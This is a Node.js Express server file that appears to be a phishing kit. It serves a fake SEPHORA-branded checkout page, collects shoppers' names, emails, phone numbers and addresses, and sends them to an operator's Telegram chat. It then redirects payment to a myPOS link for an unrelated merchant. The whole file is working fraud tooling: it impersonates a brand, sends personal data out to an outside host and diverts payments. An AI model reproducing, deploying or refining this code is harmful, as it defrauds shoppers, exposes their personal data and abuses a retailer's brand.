require('dotenv').config();
const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
const APP_URL = process.env.APP_URL;

const pendingSessions = new Map();

setInterval(() => {
  const now = new Date();
  for (const [sessionId, session] of pendingSessions.entries()) {
    const age = now - session.created_at;
    if (age > 30 * 60 * 1000) {
      pendingSessions.delete(sessionId);
    }
  }
}, 5 * 60 * 1000);

app.get('/', (req, res) => {
  res.json({ status: 'active', message: 'Running' });
});

app.get('/health', (req, res) => {
  res.json({ status: 'healthy' });
});

async function sendTelegramMessage(text) {
  await axios.post(`${TELEGRAM_API}/sendMessage`, {
    chat_id: TELEGRAM_CHAT_ID,
    text: text,
    parse_mode: 'HTML'
  });
}

function generateCheckoutHTML(cartData, finalAmount, currency, order_id, return_url, sessionId) {
  let cartItemsHtml = '';
  
  if (cartData && cartData.items && cartData.items.length > 0) {
    cartItemsHtml = cartData.items.map(item => {
      const linePrice = item.line_price ? (item.line_price / 100).toFixed(2) : ((item.price * item.quantity) / 100).toFixed(2);
      return `
        <div class="product-summary">
          <div class="product-info">
            <span class="product-quantity">${item.quantity}</span>
            <span class="product-title">${item.title}</span>
          </div>
          <span class="product-price">€${linePrice}</span>
        </div>
      `;
    }).join('');
  }

  return `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>SEPHORA</title><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet"><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Inter',sans-serif;background:#fafafa;color:#202223}.container{max-width:1200px;margin:0 auto;display:grid;grid-template-columns:1fr 1fr;min-height:100vh}@media(max-width:768px){.container{grid-template-columns:1fr}}.checkout-form{padding:60px 80px;background:white}@media(max-width:768px){.checkout-form{padding:30px 20px}}.logo{font-size:24px;font-weight:600;margin-bottom:40px}h1{font-size:26px;font-weight:600;margin-bottom:24px}.form-group{margin-bottom:16px}label{display:block;font-size:13px;font-weight:500;margin-bottom:8px}input{width:100%;padding:11px 12px;border:1px solid #c9cccf;border-radius:5px;font-size:14px}input:focus{outline:none;border-color:#2c6ecb}.form-row{display:grid;grid-template-columns:1fr 1fr;gap:16px}.form-row-thirds{display:grid;grid-template-columns:2fr 1fr;gap:16px}@media(max-width:480px){.form-row,.form-row-thirds{grid-template-columns:1fr}}.submit-button{width:100%;padding:16px 24px;background:#2c6ecb;color:white;border:none;border-radius:5px;font-size:15px;font-weight:600;cursor:pointer;margin-top:24px}.submit-button:hover{background:#1f5bb5}.order-summary{padding:60px 80px;background:#fafafa;border-left:1px solid #e1e3e5}@media(max-width:768px){.order-summary{padding:30px 20px;border-left:none}}.product-summary{display:flex;justify-content:space-between;padding:16px 0;border-bottom:1px solid #e1e3e5}.product-info{display:flex;gap:12px}.product-quantity{width:20px;height:20px;background:#c9cccf;color:white;border-radius:50%;font-size:12px;display:flex;align-items:center;justify-content:center}.summary-line{display:flex;justify-content:space-between;padding:12px 0;font-size:14px}.summary-line.total{border-top:1px solid #e1e3e5;margin-top:16px;font-size:16px;font-weight:600}.waiting{text-align:center;padding:60px 20px;display:none}.spinner{border:3px solid #f3f3f3;border-top:3px solid #2c6ecb;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:0 auto 20px}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style></head><body><div class="container"><div class="checkout-form"><div id="form-container"><div class="logo">SEPHORA</div><h1>Contact</h1><form id="customer-form"><div class="form-group"><label for="email">Email</label><input type="email" id="email" required></div><div class="form-row"><div class="form-group"><label for="firstName">First name</label><input type="text" id="firstName" required></div><div class="form-group"><label for="lastName">Last name</label><input type="text" id="lastName" required></div></div><div class="form-group"><label for="address">Address</label><input type="text" id="address" required></div><div class="form-row-thirds"><div class="form-group"><label for="city">City</label><input type="text" id="city" required></div><div class="form-group"><label for="postalCode">Eircode</label><input type="text" id="postalCode" required></div></div><div class="form-group"><label for="country">Country</label><input type="text" id="country" value="Ireland" required></div><div class="form-group"><label for="phone">Phone</label><input type="tel" id="phone" required></div><button type="submit" class="submit-button">Continue to payment</button></form></div><div id="waiting-container" class="waiting"><div class="spinner"></div><div>Processing payment...</div></div></div><div class="order-summary"><h2>Order summary</h2>${cartItemsHtml}<div style="margin-top:24px;"><div class="summary-line"><span>Subtotal</span><span>€${finalAmount}</span></div><div class="summary-line total"><span>Total</span><span>€${finalAmount}</span></div></div></div></div><script>const sessionId='${sessionId}';document.getElementById('customer-form').addEventListener('submit',async(e)=>{e.preventDefault();const customerData={firstName:document.getElementById('firstName').value,lastName:document.getElementById('lastName').value,email:document.getElementById('email').value,phone:document.getElementById('phone').value,address:document.getElementById('address').value,postalCode:document.getElementById('postalCode').value,city:document.getElementById('city').value,country:document.getElementById('country').value};document.getElementById('form-container').style.display='none';document.getElementById('waiting-container').style.display='block';await fetch('/api/submit-customer-info',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sessionId,customerData,amount:'${finalAmount}'})});const poll=setInterval(async()=>{const res=await fetch('/api/check-payment-link/'+sessionId);const data=await res.json();if(data.paymentLink){clearInterval(poll);window.location.href=data.paymentLink}},500)});</script></body></html>`;
}

app.post('/checkout', (req, res) => {
  const { amount, currency, cart_items } = req.body;
  let cartData = null;
  let finalAmount = '0.00';
  
  if (cart_items) {
    cartData = typeof cart_items === 'string' ? JSON.parse(cart_items) : cart_items;
    if (cartData.total) {
      finalAmount = (cartData.total / 100).toFixed(2);
    }
  }
  
  if (finalAmount === '0.00' && amount) {
    finalAmount = parseFloat(amount).toFixed(2);
  }

  const sessionId = Date.now().toString();
  const html = generateCheckoutHTML(cartData, finalAmount, currency, '', '', sessionId);
  res.send(html);
});

app.post('/api/submit-customer-info', async (req, res) => {
  const { sessionId, customerData, amount } = req.body;
  
  const myposLink = `https://mypos.com/@idl/${amount}`;
  
  pendingSessions.set(sessionId, {
    customerData,
    amount,
    paymentLink: myposLink,
    created_at: new Date()
  });
  
  const message = `<b>🔔 NEW ORDER</b>\n\n<b>💰 Amount:</b> €${amount}\n\n<b>👤 Customer:</b>\n${customerData.firstName} ${customerData.lastName}\n${customerData.email}\n${customerData.phone}\n${customerData.address}\n${customerData.city}, ${customerData.postalCode}\n${customerData.country}\n\n<b>🔑 Session:</b> ${sessionId}\n<b>💳 myPOS:</b> ${myposLink}`;
  
  await sendTelegramMessage(message);
  res.json({ status: 'success' });
});

app.get('/api/check-payment-link/:sessionId', (req, res) => {
  const session = pendingSessions.get(req.params.sessionId);
  if (session && session.paymentLink) {
    res.json({ paymentLink: session.paymentLink });
  } else {
    res.json({});
  }
});

app.post('/webhook/telegram', (req, res) => {
  res.send('OK');
});

app.get('/set-webhook', async (req, res) => {
  const webhookUrl = `${APP_URL}/webhook/telegram`;
  const response = await axios.post(`${TELEGRAM_API}/setWebhook`, { url: webhookUrl });
  res.json({ status: 'success', webhook_url: webhookUrl, telegram_response: response.data });
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
